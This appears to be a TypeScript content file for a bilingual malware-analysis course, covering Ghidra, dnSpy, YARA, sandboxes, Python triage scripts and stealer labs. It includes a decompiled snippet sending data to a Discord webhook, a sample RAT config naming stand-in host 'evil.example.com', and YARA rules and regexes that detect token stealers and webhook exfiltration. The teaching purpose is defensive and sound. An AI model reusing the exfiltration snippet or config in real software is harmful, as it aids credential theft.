import type { LearnArticle } from "@/lib/learn-types";
import { text } from "@/lib/learn-types";


function article(
  slug: string,
  titlePt: string,
  titleEn: string,
  descriptionPt: string,
  descriptionEn: string,
  difficulty: LearnArticle["difficulty"],
  minutes: number,
  safety: LearnArticle["safety"],
  group: string,
  steps: LearnArticle["steps"],
  related: string[] = []
): LearnArticle {
  return {
    kind: "article",
    slug,
    title: text(titlePt, titleEn),
    description: text(descriptionPt, descriptionEn),
    difficulty,
    minutes,
    safety,
    group,
    steps,
    related,
  };
}

export const childLearnArticles: LearnArticle[] = [
  article(
    "ghidra/install",
    "Instalacao do Ghidra",
    "Installing Ghidra",
    "Baixe, extraia e valide o ambiente para comecar com engenharia reversa estatica.",
    "Download, extract, and validate the environment to start static reverse engineering.",
    "beginner",
    10,
    "static-only",
    "ghidra",
    [
      {
        id: "download",
        title: text("Baixar e abrir", "Download and launch"),
        paragraphs: [
          text("Baixe a versao mais recente no repositorio oficial e extraia em uma pasta dedicada da VM.", "Download the latest version from the official repository and extract it into a dedicated VM folder."),
          text("No primeiro start, aponte um JDK valido e crie um projeto limpo so para amostras suspeitas.", "On first launch, point it to a valid JDK and create a clean project just for suspicious samples."),
        ],
      },
    ]
  ),
  article(
    "ghidra/import",
    "Importar e configurar analise",
    "Import and configure analysis",
    "Importe o binario e escolha opcoes de analise automatica.",
    "Import the binary and choose auto-analysis options.",
    "beginner",
    12,
    "static-only",
    "ghidra",
    [
      {
        id: "import",
        title: text("Importacao", "Import"),
        paragraphs: [
          text("Arraste o binario para o projeto, confirme o formato e aceite a analise automatica inicial.", "Drag the binary into the project, confirm the format, and accept initial auto-analysis."),
        ],
      },
      {
        id: "focus",
        title: text("Onde focar primeiro", "Where to focus first"),
        bullets: [
          text("Entry point", "Entry point"),
          text("Imports", "Imports"),
          text("Strings e XRefs", "Strings and XRefs"),
          text("Secoes com alta entropia", "High-entropy sections"),
        ],
        paragraphs: [text("Se o binario estiver empacotado, complemente com outras ferramentas e nao force atribuicao precoce.", "If the binary is packed, complement with other tools and avoid forcing early attribution.")],
      },
    ]
  ),
  article(
    "ghidra/strings",
    "Encontrar strings no Ghidra",
    "Finding strings in Ghidra",
    "Use strings e referencias cruzadas para localizar IOC.",
    "Use strings and cross-references to locate IOC.",
    "beginner",
    12,
    "static-only",
    "ghidra",
    [
      {
        id: "strings",
        title: text("Strings e XRefs", "Strings and XRefs"),
        paragraphs: [
          text("Abra Window > Defined Strings, filtre por discord, telegram, login data, run e termos de interesse.", "Open Window > Defined Strings and filter by discord, telegram, login data, run, and other target terms."),
          text("Sempre abra XRefs da string para descobrir qual funcao usa aquele valor.", "Always open XRefs for a string to see which function uses that value."),
        ],
      },
    ]
  ),
  article(
    "ghidra/webhooks",
    "Localizar webhooks e C2",
    "Locating webhooks and C2",
    "Estruture a busca por canais de exfiltracao e infraestrutura remota.",
    "Structure your search for exfiltration channels and remote infrastructure.",
    "intermediate",
    15,
    "static-only",
    "ghidra",
    [
      {
        id: "patterns",
        title: text("Padroes comuns", "Common patterns"),
        bullets: [
          text("discord.com/api/webhooks", "discord.com/api/webhooks"),
          text("api.telegram.org/bot", "api.telegram.org/bot"),
          text("gate.php, panel, connect, beacon", "gate.php, panel, connect, beacon"),
        ],
        paragraphs: [text("Nao pare no primeiro resultado. Muitos artefatos mantem fallback para Discord, Telegram ou HTTP puro.", "Do not stop at the first result. Many artifacts keep fallback routes for Discord, Telegram, or plain HTTP.")],
      },
    ]
  ),
  article(
    "ghidra/flow",
    "Analisar fluxo de execucao",
    "Analyze execution flow",
    "Siga a trilha do entry point ate o comportamento que interessa.",
    "Follow the trail from the entry point to the behavior that matters.",
    "intermediate",
    18,
    "static-only",
    "ghidra",
    [
      {
        id: "flow",
        title: text("Entry point para funcoes chave", "Entry point to key functions"),
        paragraphs: [
          text("Rastreie chamadas ate achar rotina de rede, persistencia, descriptografia ou coleta de credenciais.", "Trace calls until you find networking, persistence, decryption, or credential collection routines."),
        ],
      },
    ]
  ),
  article(
    "ghidra/decompiler",
    "Usar o decompiler",
    "Using the decompiler",
    "Transforme assembly em pseudo-C legivel e renomeie funcoes importantes.",
    "Turn assembly into readable pseudo-C and rename important functions.",
    "intermediate",
    14,
    "static-only",
    "ghidra",
    [
      {
        id: "decompiler",
        title: text("Renomeie para entender", "Rename to understand"),
        paragraphs: [
          text("Renomear variaveis e funcoes muda completamente a leitura do fluxo e ajuda a documentar o que a amostra faz.", "Renaming variables and functions completely changes readability and helps document what the sample does."),
        ],
        comparison: {
          before: {
            label: text("Antes", "Before"),
            code: "void FUN_00401234(char *p1) {\n  char *v1;\n  v1 = \"https://discord.com/api/webhooks/...\";\n  InternetOpenUrlA(0, v1, p1, 0, 0, 0);\n}",
          },
          after: {
            label: text("Depois", "After"),
            code: "void send_data_to_webhook(char *payload) {\n  char *webhook_url;\n  webhook_url = \"https://discord.com/api/webhooks/...\";\n  InternetOpenUrlA(0, webhook_url, payload, 0, 0, 0);\n}",
          },
        },
      },
    ]
  ),
  article(
    "ghidra/scripts",
    "Scripts Ghidra",
    "Ghidra scripts",
    "Automatize tarefas repetitivas como localizar webhooks ou APIs sensiveis.",
    "Automate repetitive tasks such as locating webhooks or sensitive APIs.",
    "advanced",
    16,
    "static-only",
    "ghidra",
    [
      {
        id: "script",
        title: text("Exemplo util", "Useful example"),
        paragraphs: [text("Use scripts quando estiver repetindo a mesma busca em varias amostras de uma familia.", "Use scripts when repeating the same search across samples from one family.")],
        code: {
          language: "python",
          value: "from ghidra.program.flatapi import FlatProgramAPI\nflat = FlatProgramAPI(currentProgram)\nlisting = currentProgram.getListing()\nfor data in listing.getDefinedData(True):\n    value = str(data.getValue())\n    if \"discord.com/api/webhooks\" in value.lower() or \"api.telegram.org/bot\" in value.lower():\n        print(data.getAddress(), value)",
        },
      },
    ]
  ),
  article(
    "dnspy/install",
    "Instalacao do dnSpy",
    "Installing dnSpy",
    "Baixe o fork mantido e prepare a VM para .NET.",
    "Download the maintained fork and prepare the VM for .NET work.",
    "beginner",
    8,
    "static-only",
    "dnspy",
    [{ id: "install", title: text("Download", "Download"), paragraphs: [text("Use o fork dnSpyEx e extraia em uma pasta fixa da VM.", "Use the dnSpyEx fork and extract it into a fixed folder inside the VM.")] }]
  ),
  article(
    "dnspy/navigate",
    "Navegar no codigo .NET",
    "Navigating .NET code",
    "Aprenda a localizar namespaces, classes e metodos relevantes.",
    "Learn how to locate namespaces, classes, and relevant methods.",
    "beginner",
    12,
    "static-only",
    "dnspy",
    [{ id: "navigate", title: text("Onde olhar primeiro", "Where to look first"), bullets: [text("Config", "Config"), text("Settings", "Settings"), text("Program", "Program"), text("Builder", "Builder")], paragraphs: [text("Stealers e RATs .NET costumam centralizar configuracao nessas classes.", ".NET stealers and RATs often centralize configuration in these classes.")] }]
  ),
  article(
    "dnspy/find-config",
    "Encontrar configuracao",
    "Finding configuration",
    "Extraia host, porta, mutex, chave e webhook de forma estruturada.",
    "Extract host, port, mutex, key, and webhook in a structured way.",
    "intermediate",
    14,
    "static-only",
    "dnspy",
    [
      {
        id: "config",
        title: text("Config central", "Central config"),
        paragraphs: [text("A maioria das familias .NET deixa nomes de campos muito claros, mesmo depois de alguma ofuscacao.", "Most .NET families keep field names fairly clear even after some obfuscation.")],
        code: {
          language: "csharp",
          value: "public static class Settings {\n  public static string Hosts = \"evil.example.com\";\n  public static string Ports = \"6606\";\n  public static string Key = \"TXlTZWNyZXRLZXkxMjM=\";\n  public static string MTX = \"AsyncMutex_6SI8OkPnk\";\n}",
        },
      },
    ]
  ),
  article(
    "dnspy/patch",
    "Patch e leitura controlada",
    "Patch and controlled reading",
    "Edite nomes e offsets para estudo, sem transformar isso em execucao operacional.",
    "Edit names and offsets for study without turning this into operational execution.",
    "advanced",
    14,
    "static-only",
    "dnspy",
    [{ id: "patch", title: text("Uso correto", "Correct use"), paragraphs: [text("Use o modo de edicao para renomear, ajustar strings e confirmar leitura. Nao use isso para construir ou rodar o malware.", "Use edit mode to rename, adjust strings, and confirm understanding. Do not use it to build or run the malware.")] }]
  ),
  article(
    "yara/basics",
    "Sintaxe basica do YARA",
    "Basic YARA syntax",
    "Strings, meta e condition para regras robustas.",
    "Strings, meta, and condition for robust rules.",
    "beginner",
    12,
    "static-only",
    "yara",
    [{ id: "syntax", title: text("Estrutura minima", "Minimum structure"), paragraphs: [text("Comece pequeno e prefira sinais distintivos.", "Start small and prefer distinctive signals.")], code: { language: "yara", value: "rule Generic_Discord_Stealer {\n  meta:\n    family = \"Generic Token Stealer\"\n    severity = \"HIGH\"\n  strings:\n    $webhook = /https:\\/\\/discord(?:app)?\\.com\\/api\\/webhooks\\/\\d+\\/[\\w-]+/\n    $token = /[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/\n  condition:\n    uint16(0) == 0x5A4D and $webhook and $token\n}" } }]
  ),
  article(
    "yara/write",
    "Escrever regras para familias reais",
    "Writing rules for real families",
    "Use combinacao de strings, paths e comportamento inferido.",
    "Use a combination of strings, paths, and inferred behavior.",
    "intermediate",
    16,
    "static-only",
    "yara",
    [{ id: "write", title: text("Evite falso positivo", "Avoid false positives"), paragraphs: [text("Nao use apenas uma string comum. Combine identificadores de familia, paths e sinais de exfiltracao.", "Do not rely on one common string. Combine family identifiers, paths, and exfiltration markers.")] }]
  ),
  article(
    "yara/test",
    "Testar e refinar",
    "Testing and refining",
    "Valide regras em pasta de amostras e contra arquivos limpos.",
    "Validate rules on sample sets and against clean files.",
    "intermediate",
    10,
    "static-only",
    "yara",
    [{ id: "test", title: text("Comandos uteis", "Useful commands"), paragraphs: [text("Toda regra boa precisa passar por amostra maliciosa e amostra limpa.", "Every good rule needs both malicious and clean validation.")], code: { language: "bash", value: "yara -s minha_regra.yar sample.exe\nyara minha_regra.yar C:\\samples -r\nyara --json minha_regra.yar sample.exe" } }]
  ),
  article(
    "dynamic/any-run",
    "Usando Any.run",
    "Using Any.run",
    "Observacao em tempo real para confirmar comportamento suspeito.",
    "Real-time observation to confirm suspicious behavior.",
    "intermediate",
    12,
    "sandbox-required",
    "dynamic",
    [{ id: "run", title: text("Fluxo basico", "Basic flow"), bullets: [text("Criar task nova", "Create a new task"), text("Selecionar Windows x64", "Select Windows x64"), text("Observar processos, rede e arquivos criados", "Observe processes, network, and created files")], paragraphs: [text("Use o resultado dinamico para validar o que a triagem estatica sugeriu.", "Use dynamic output to validate what static triage suggested.")] }]
  ),
  article(
    "dynamic/triage",
    "Usando Triage",
    "Using Triage",
    "Boa escolha para familia, tags e contexto automatizado.",
    "A strong choice for family tags and automated context.",
    "intermediate",
    10,
    "sandbox-required",
    "dynamic",
    [{ id: "triage", title: text("Quando preferir", "When to prefer it"), paragraphs: [text("Triage e excelente para hash lookup, familia conhecida e visao consolidada de IOC.", "Triage is excellent for hash lookups, known families, and consolidated IOC views.")] }]
  ),
  article(
    "dynamic/local",
    "Sandbox local com VM",
    "Local sandbox with a VM",
    "Configure Procmon, Wireshark e snapshots para analise controlada.",
    "Configure Procmon, Wireshark, and snapshots for controlled analysis.",
    "advanced",
    18,
    "sandbox-required",
    "dynamic",
    [{ id: "local", title: text("Workflow minimo", "Minimum workflow"), bullets: [text("Restaurar snapshot limpo", "Restore clean snapshot"), text("Abrir Procmon e Wireshark", "Open Procmon and Wireshark"), text("Executar apenas dentro da VM", "Execute only inside the VM"), text("Restaurar snapshot apos o teste", "Restore snapshot after the test")], paragraphs: [text("Esse fluxo nunca deve sair da VM.", "This workflow must never leave the VM.")] }]
  ),
  article(
    "python/extract-strings",
    "Extrair strings com Python",
    "Extract strings with Python",
    "Reproduza extracao ASCII e UTF-16 sem executar nada.",
    "Reproduce ASCII and UTF-16 extraction without running anything.",
    "beginner",
    12,
    "static-only",
    "python",
    [{ id: "script", title: text("Script base", "Base script"), paragraphs: [text("Trate sempre a amostra como bytes.", "Always treat the sample as bytes.")], code: { language: "python", value: "import re\n\ndef extract_ascii(data, min_length=6):\n    pattern = rb'[\\x20-\\x7e]{' + str(min_length).encode() + rb',}'\n    return [m.group().decode('ascii') for m in re.finditer(pattern, data)]\n\ndef extract_utf16(data, min_length=6):\n    pattern = rb'(?:[\\x20-\\x7e]\\x00){' + str(min_length).encode() + rb',}'\n    values = []\n    for match in re.finditer(pattern, data):\n        values.append(match.group().decode('utf-16-le', errors='ignore'))\n    return values" } }]
  ),
  article(
    "python/parse-pe",
    "Parse de PE com pefile",
    "PE parsing with pefile",
    "Leia secoes, imports e entropia sem depender da UI.",
    "Read sections, imports, and entropy without depending on a UI.",
    "intermediate",
    14,
    "static-only",
    "python",
    [{ id: "pefile", title: text("Imports e entropia", "Imports and entropy"), code: { language: "python", value: "import pefile\n\npe = pefile.PE('sample.exe')\nfor section in pe.sections:\n    print(section.Name.decode(errors='ignore').strip('\\x00'), section.get_entropy())\nfor entry in getattr(pe, 'DIRECTORY_ENTRY_IMPORT', []):\n    for imp in entry.imports:\n        if imp.name:\n            print(entry.dll.decode(), imp.name.decode())" }, paragraphs: [text("Isso permite automatizar triagem sem executar a amostra.", "This lets you automate triage without executing the sample.")] }]
  ),
  article(
    "python/detect-webhooks",
    "Detectar webhooks com Python",
    "Detect webhooks with Python",
    "Cubra Discord, Telegram e outros endpoints suspeitos.",
    "Cover Discord, Telegram, and other suspicious endpoints.",
    "intermediate",
    14,
    "static-only",
    "python",
    [{ id: "regex", title: text("Regex inicial", "Initial regex"), paragraphs: [text("Nao envie nada para o endpoint. Detecte, registre e reporte pelos canais oficiais.", "Do not send anything to the endpoint. Detect, record, and report through official channels.")], code: { language: "python", value: "import re\n\npatterns = {\n    'discord': re.compile(r'https://(?:canary\\.)?discord(?:app)?\\.com/api/(?:v\\d+/)?webhooks/\\d+/[\\w-]+', re.I),\n    'telegram': re.compile(r'https://api\\.telegram\\.org/bot\\d+:[\\w-]+/(?:send\\w+|getUpdates)', re.I),\n}\n\nfor name, pattern in patterns.items():\n    for match in pattern.finditer(text_blob):\n        print(name, match.group(0))" } }]
  ),
  article(
    "labs/lab-01",
    "Lab 01: stealer com webhook",
    "Lab 01: stealer with a webhook",
    "Encontrar IOC, webhook e comportamento de exfiltracao.",
    "Find IOC, webhook, and exfiltration behavior.",
    "beginner",
    25,
    "vm-required",
    "labs",
    [{ id: "lab", title: text("Objetivo", "Goal"), paragraphs: [text("Baixe uma amostra publica no MalwareBazaar, abra na VM e documente webhook, paths de navegador e persistencia.", "Download a public sample from MalwareBazaar, open it inside the VM, and document the webhook, browser paths, and persistence.")] }]
  ),
  article(
    "labs/lab-02",
    "Lab 02: desempacotar UPX",
    "Lab 02: unpack UPX",
    "Revelar o binario real antes da triagem mais profunda.",
    "Reveal the real binary before deeper triage.",
    "beginner",
    20,
    "vm-required",
    "labs",
    [{ id: "upx", title: text("Comando", "Command"), paragraphs: [text("Depois do unpack, volte ao PEStudio e ao Ghidra para comparar a visibilidade.", "After unpacking, go back to PEStudio and Ghidra to compare visibility.")], code: { language: "bash", value: "upx -d malware_packed.exe -o malware_unpacked.exe" } }]
  ),
  article(
    "labs/lab-03",
    "Lab 03: stealer com Telegram",
    "Lab 03: stealer with Telegram",
    "Encontrar tokens de bot, chat_id e rotinas de envio.",
    "Find bot tokens, chat_id values, and send routines.",
    "intermediate",
    30,
    "vm-required",
    "labs",
    [{ id: "telegram", title: text("Foco", "Focus"), paragraphs: [text("Busque por api.telegram.org, sendMessage, sendDocument e chat_id. Valide imports e strings relacionadas.", "Search for api.telegram.org, sendMessage, sendDocument, and chat_id. Validate related imports and strings.")] }]
  ),
];
